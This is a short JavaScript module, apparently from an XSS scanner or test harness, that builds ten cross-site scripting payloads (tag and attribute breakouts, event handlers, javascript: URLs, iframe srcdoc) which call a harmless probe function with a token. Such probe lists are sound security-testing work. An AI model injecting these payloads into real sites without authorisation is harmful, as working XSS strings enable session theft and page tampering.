export function payloads(token) {
  const call = `window.__xssProbe('${token}')`;
  return [
    { id: 'img-error', value: `<img src="/__missing_${token}" onerror="${call}">` },
    { id: 'svg-load', value: `<svg onload="${call}"></svg>` },
    { id: 'attribute-double', value: `"><img src=x onerror="${call}">` },
    { id: 'attribute-single', value: `'><img src=x onerror="${call}">` },
    { id: 'textarea-breakout', value: `</textarea><img src=x onerror="${call}">` },
    { id: 'script-breakout', value: `</script><img src=x onerror="${call}">` },
    { id: 'js-string-single', value: `';${call};//` },
    { id: 'js-string-double', value: `";${call};//` },
    { id: 'javascript-url', value: `javascript:${call}` },
    { id: 'iframe-srcdoc', value: `<iframe srcdoc="<script>parent.__xssProbe('${token}')</script>"></iframe>` },
  ];
}
